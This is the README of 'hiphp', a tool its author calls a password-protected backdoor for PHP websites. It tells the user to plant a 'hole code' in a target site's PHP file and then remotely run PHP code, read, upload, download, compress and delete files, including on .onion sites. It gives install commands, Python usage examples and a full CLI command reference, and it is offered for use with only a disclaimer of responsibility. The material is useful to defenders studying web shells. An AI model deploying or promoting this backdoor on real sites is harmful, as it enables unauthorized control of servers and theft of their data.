<img align="right" height="200" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/install/hiphp.png" alt="hiphp by yasserbdj96">
<h2>hiphp for control php websites.</h2>
<p>hiphp is BackDoor to control php based sites and hiphp can be controlled by sending commands, files and tokens to the site using http/https protocol. After copying HIPHP_HOLE_CODE and placing it in any php file on the target website, you will have permissions to enter it and read all files, delete, download and even upload new files to it. Hiphp also enables you to connect to ".onion" sites. Also, this back door is password protected.</p>

Don't forget to star ⭐ this repository.

[![Test on Ubuntu latest](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app-on-linux.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app-on-linux.yml)
[![Test on Windows latest](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app-on-win.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app-on-win.yml)
[![Test on MacOS latest](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app-on-mac.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/python-app-on-mac.yml)
[![pypi-setup](https://github.com/yasserbdj96/hiphp/actions/workflows/pypi-setup.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/pypi-setup.yml)
[![Docker image](https://github.com/yasserbdj96/hiphp/actions/workflows/docker-image.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/docker-image.yml)
[![ubuntu install](https://github.com/yasserbdj96/hiphp/actions/workflows/ubuntu-install.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/ubuntu-install.yml)
[![pages-build-deployment](https://github.com/yasserbdj96/hiphp/actions/workflows/pages/pages-build-deployment/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/pages/pages-build-deployment)
[![CodeQL](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml)
[![CodeFactor](https://www.codefactor.io/repository/github/yasserbdj96/hiphp/badge)](https://www.codefactor.io/repository/github/yasserbdj96/hiphp)
[![Supported Versions](https://img.shields.io/pypi/pyversions/hiphp.svg)](https://pypi.org/project/hiphp) 
[![Visitors](https://visitor-badge.laobi.icu/badge?page_id=yasserbdj96.hiphp)](https://github.com/yasserbdj96/hiphp)
[![Join the chat at https://gitter.im/yasserbdj96/hiphp](https://badges.gitter.im/yasserbdj96/hiphp.svg)](https://gitter.im/yasserbdj96/hiphp?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)

<!--h2>How hiphp works?</h2>
<div align="center">
    <img src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/how_hiphp_works.png" alt="hiphp by yasserbdj96">
</div-->

<h2>How do you use this version of the project?</h2>
[✓] Command line interface CLI.<br>
[✓] Graphical user interface GUI (beta).<br>
[✓] Python Module.<br>
[✓] Script.<br>
[✓] Docker Container.

<h2>Languages:</h2>
* python3<br>
* php

<h2>Requirements:</h2>
<!--[✓] <a href="https://github.com/yasserbdj96/ashar">ashar</a><br-->
[✓] <a href="https://github.com/psf/requests">requests</a><br>
[✓] <a href="https://github.com/yasserbdj96/hexor">hexor</a><br>
[✓] <a href="https://github.com/yasserbdj96/biglibrary">biglibrary</a>

<h2>Supported Distributions:</h2>

| Distribution     | Version Check | Python Test Version       | Supported | Status    | Everything works |
| :--------------: | :-----------: | :-----------------------: | :-------: | :-------: | :--------------: |
| Ubuntu           | 20.04.4       | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |
| Windwos          | 10.0.20348    | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |
| MacOS            | 11.6.6        | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |
| Android (termux) | 10 (0.118.0)  | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |
| Android (nethunter)| 10 (2022.3) | 3.6, 3.7, 3.8, 3.9, 3.10  | Yes       | Working   | Yes              |

<h2>Docker pull,build & run:</h2>

```bash
# pull:
>>> docker pull yasserbdj96/hiphp:latest

# build:
>>> docker build -t docker.io/yasserbdj96/hiphp:latest .

# run:
>>> docker run -e KEY="<KEY>" -e URL="<URL>" -i -t docker.io/yasserbdj96/hiphp:latest
```

<h2>Github Packages pull,build & run:</h2>

```bash
# pull:
>>> docker pull ghcr.io/yasserbdj96/hiphp:latest

# build:
>>> docker build -t ghcr.io/yasserbdj96/hiphp:latest .

# run:
>>> docker run -e KEY="<KEY>" -e URL="<URL>" -i -t ghcr.io/yasserbdj96/hiphp:latest
```

<h2>Python Package Installation:</h2>

```
# install from pypi:
>>> pip install hiphp
# OR
>>> python -m pip install hiphp

# local install:
>>> git clone https://github.com/yasserbdj96/hiphp.git
>>> cd hiphp
>>> sudo python setup.py install

# uninstall:
>>> pip uninstall hiphp
```

<h2>Ubuntu Installation:</h2>

```
# install:
>>> git clone https://github.com/yasserbdj96/hiphp.git
>>> pip install -r hiphp/requirements.txt
>>> cd hiphp/install
>>> bash install.sh -i
>>> hiphp

# update:
>>> cd hiphp/install
>>> bash install.sh -up

# uninstall:
>>> cd hiphp/install
>>> bash install.sh -u
```

<h2>Run without installation:</h2>

```
>>> git clone https://github.com/yasserbdj96/hiphp.git
>>> cd hiphp
>>> pip install -r requirements.txt
>>> python3 run.py <KEY> <URL>
```

<h2>Run with tools:</h2>

```
# run with hiphp_desktop tool:
>>> git clone https://github.com/yasserbdj96/hiphp.git
>>> cd hiphp
>>> cp -r "hiphp" "tools/hiphp_desktop/"
>>> cd tools/hiphp_desktop/
>>> pip install -r requirements.txt
>>> python3 main.py

# run with hiphp_ftp tool:
>>> git clone https://github.com/yasserbdj96/hiphp.git
>>> cd hiphp
>>> cp -r "hiphp" "tools/hiphp_ftp/"
>>> cd tools/hiphp_ftp/
>>> pip install -r requirements.txt
>>> python3 main.py <KEY> <URL>
```

<h2>Script Usage:</h2>

```python
from hiphp import *

# connect:
p1=hiphp(key="<KEY>",url="<URL>")
```

<h2>Script Examples:</h2>

```python
#START{
from hiphp import *

# connect:
p1=hiphp(key="123",url="http://127.0.0.1/index.php")#Default: retu=False.
#p1=hiphp(key="123",url="http://kfdjlkgjflkgjdfkjgkfdjgkjdfkgjk.onion/index.php")
#p1=hiphp(key="123",url="https://google.com/index.php")

# Get the hole Code:
p1.get_hole()# Copy this code into the file whose path you entered earlier. ex: https://localhost/index.php

# Example:1
# Command:
p1.run("echo 'this is a test';")

# Example:2
# Run code from file:
p1.run_file("./examples.php")# Run code from file.
p1.run_file("./examples.php","var1==true","var2==hiii")# Run code from file With the entry of variables.

# Example:3
# Upload a file:
p1.upload("./examples.php")# Upload a file to the current directory.
p1.upload("./examples.php","./upload_path/")# Upload a file to a specific directory.

# Example:4
# Compress a path:
p1.compress()# Compress the current directory.
p1.compress("./example/")# Compress a specific directory.

# Example:5
# download a file:
p1.download("example.zip")# download a specific file to the current directory.
p1.download("example.zip","<OUT_PATH>")# download a specific file to specific directory.

# Example:6
# Command line interface:
p1.cli()
#}END.
```

<h2>Help for Command Line interface (CLI):</h2>

```
hiphp Commands :
════════════════
  Command                            Description
  -------                            -----------
[OPTIONS]

  --help, help                       ─> # Display this help.
  --help [ACTIONS], help [ACTIONS]   ─> # Help for a specific command.
  --geth, geth                       ─> # Get the hole Code, "HIPHP_HOLE_CODE" It has the same purpose.
  --phpinfo, phpinfo                 ─> # Some information about the server.
  --cls, cls                         ─> # Clear console.
  --exit, exit                       ─> # Exit this console.

[ACTIONS]

  --ls, ls                           ─> # List information about the FILEs (the current directory by default).
  Usage: --ls [OPTION] [PATH], ls [OPTION] [PATH]
  Mandatory arguments to long options:
    --ls                             ─> # Get a list of all files and folders from the current directory.
    --ls [PATH]                      ─> # Get a list of all files and folders from a specified directory.
    --ls -all                        ─> # Get a list of all files, folders and subfolders from the current directory.
    --ls -all [PATH]                 ─> # Get a list of all files, folders and subfolders from a specified directory.

  --cat, cat                         ─> # Concatenate FILE to standard output.
  Usage: --cat [FILE_PATH]

  --set, set                         ─> # Create a code that is always saved on during work.
  Usage: --set [PHP_CODE]
  You can return the initial value with "--dset" or "dset".

  --cd, cd                           ─> # Change directory.
  Usage: --cd [PATH]

  --rf, rf                           ─> # Run code from file.
  Usage: --rf [FILE_PATH] [VARIABLES]
  Mandatory arguments to long options:
    --rf [FILE_PATH]                 ─> # Run code from file.
    --rf [FILE_PATH] [VARIABLES]     ─> # Run code from file with variables, EX: --rf example.php var==hello
  
  --up, up                           ─> # Upload a file.
  Usage: --up [FILE_PATH] [PATH]
  Mandatory arguments to long options:
    --up [FILE_PATH]                 ─> # Upload a file to the current directory.
    --up [FILE_PATH] [PATH]          ─> # Upload a file to a specified directory.

  --down, down                       ─> # download a file.
  Usage: --down [-f/-d] [FILE/DIR_PATH] [OUT_PATH]
  Mandatory arguments to long options:
    --down -f [FILE_PATH]            ─> # Download a file to the current directory.
    --down -f [FILE_PATH] [OUT_PATH] ─> # Download file to a specified directory.
    --down -d [DIR_PATH]             ─> # Download a folder to the current directory.
    --down -d [DIR_PATH] [OUT_PATH]  ─> # Download folder to a specified directory.
    --down -all                      ─> # Download all files to the current directory.
    --down -all [OUT_PATH]           ─> # Download all files to a specified directory.

  --zip, zip                         ─> # Compress a directory.
  Usage: --zip [DIR_PATH]
  Mandatory arguments to long options:
    --zip                            ─> # Compress the current directory.
    --zip [DIR_PATH]                 ─> # Compress a specific directory.

[ABOUT]

  --update, update                   ─> # check for updates.
  --license, license                 ─> # This project license.
  --about, about                     ─> # About this project.
```

<h2>HIPHP_HOLE_CODE Example:</h2>
<div align="center">
    <img src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/HIPHP_HOLE_CODE.png" alt="hiphp by yasserbdj96">
</div>


<h2>Screenshots:</h2>

<div align="center">
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot0.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot0.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot1.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot1.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot2.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot2.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot3.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot3.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_ftp/screenshot/screenshot.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_ftp/screenshot/screenshot.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_desktop/screenshot/screenshot.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_desktop/screenshot/screenshot.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_desktop/screenshot/screenshot1.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_desktop/screenshot/screenshot1.png" alt="hiphp by yasserbdj96">
    </a>
    <a href="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_desktop/screenshot/screenshot2.png">
        <img height="100" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/tools/hiphp_desktop/screenshot/screenshot2.png" alt="hiphp by yasserbdj96">
    </a>
</div>

<h2>Changelog History:</h2>

```
## 0.2.24 [01-09-2022][Last Version]
 - Fix "hiphp --ftp"
 - Add "--cd" command for Change directory.
 - Update all commands from "--command" to "command" (You can use both).
 - Update & fix bugs in "hiphp --dst".
 - Update help menu.
 - Bug fixes & performance improvements.

## 0.2.23 [22-08-2022]
 - Fix the entry with uppercase and lowercase letters.
 - Add "--down" command for Download files & folders.
 - Add "--zip" command for Compress files & folders.
 - Update "--help" to "--help [ACTION]".
 - Update the help list and enable it to display help when something goes wrong.
 - Bug fixes & performance improvements.

## 0.2.22 [20-08-2022]
 - Update some info on pypi.
 - Fix "setup.py" windows os.
 - Bug fixes & performance improvements.

## 0.2.21 [18-08-2022]
 - Add "--update" command for check updates.
 - Add "--phpinfo" command for check some server informations.
 - Fix not being able to install internally on Nethunter.
 - Fix some issues in uploading files.
 - Bug fixes & performance improvements.

## 0.2.20 [10-08-2022]
 - Change the display of files in the command "--ls"
 - Fix "HIPHP_HOLE_CODE".
 - Add "--cls" command to clear console.
 - Slight change to the command line interface logo.
 - Bug fixes & performance improvements.

## 0.2.19 [30-07-2022]
 - Preparing for the new version.
 - Rework the software rights with the addition of the Bitcoin wallet address.
 - new logo design.
 - Bug fixes & performance improvements.

## 0.2.18 [06-07-2022]
 - Bug fixes & performance improvements.

## 0.2.17 [03-07-2022]
 - Bug fixes on windows os.

## 0.2.16 [02-07-2022][Version cancelled]
 - Bug fixes & performance improvements.

## 0.2.15 [22-06-2022][Version cancelled]
 - New build.
 - More stability.
 - Command interface update.
 - More commands.
 - Giving access to .onion sites.
 - help menu update.
 - Bug fixes & performance improvements.

## 0.1.14 [06-11-2021][Version cancelled]
 - help menu update.
 - Bug fixes & performance improvements.

## 0.1.13 [09-11-2021][Version cancelled]
 - Safety upgrade.
 - Bug fixes & performance improvements.

## 0.1.12 [09-11-2021][Version cancelled]
 - Safety upgrade.
 - Bug fixes & performance improvements.

## 0.1.11 [03-11-2021][Version cancelled]
 - Command interface update.
 - Bug fixes & performance improvements.

## 0.1.10 [26-07-2021][Version cancelled]
 - Fix Bugs.

## 0.1.9 [07-06-2021][Version cancelled]
 - fix bugs.

## 0.1.8 [2021][Version cancelled]
 - Fix bugs.

## 0.1.7 [04-06-2021][Version cancelled]
 - fix bugs.

## 0.1.6 [04-06-2021][Version cancelled]
 - fix bugs.
 - add upload to upload any file.
 - Simplify the use of the program.

## 0.1.5 [26-05-2021][Version cancelled]
 - fix bugs.

## 0.1.4 [15-05-2021][Version cancelled]
 - fix bugs.
 - new build.

## 0.1.3 [12-05-2021][Version cancelled]
 - Fix bugs.

## 0.1.2 [10-05-2021][Version cancelled]
 - Fix bugs.

## 0.1.1 [06-05-2021][Version cancelled]
 - Import pakages by pipincluder.
 - Fix bugs.

## 0.1.0 [18-04-2021][Version cancelled]
 - New build.
 - Fix bugs.

## 0.0.4 [06-04-2021][Version cancelled]
 - Fix bugs.

## 0.0.3 [06-04-2021][Version cancelled]
 - Fix bugs.

## 0.0.2 [05-04-2021][Version cancelled]
 - Fix bugs.
 - Add help list.
 - Add Executing from files.

## 0.0.1 [05-04-2021][Version cancelled]
 - First public release.
```

<h2>Important Notes:</h2>
- When you use the program for the first time on a site, the code HIPHP_HOLE_CODE will show you, copy it and upload it to the path you want to connect to, for example 'https://localhost/inc/ex.php'.<br>
- In order for the program to work well and without errors, HIPHP_HOLE_CODE must be placed at the top of the target file.<br>
- The program will not work and it will show you a message stating that you are unable to connect to the site if you do not enter the correct path to the location of HIPHP_HOLE_CODE via the link.<br>
- If you use hiphp on .onion sites, you must run tor services or tor browser.<br>
- I AM NOT RESPONSIBLE HOW YOU USE MY TOOLS/PROGRAMS/PROJECTS. BE LEGAL AND NOT STUPID.

<h1></h1> 

all posts [`#yasserbdj96`](#yasserbdj96) ,all views my own.

<br>
<div align="center">
    <a href="https://ko-fi.com/yasserbdj96">
        <img src="https://ko-fi.com/img/githubbutton_sm.svg" alt="hiphp by yasserbdj96">
    </a>
    <br>
    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9
    <br>
    <a href="http://yasserbdj96.github.io/">Go to this link to get more information.</a>
</div>
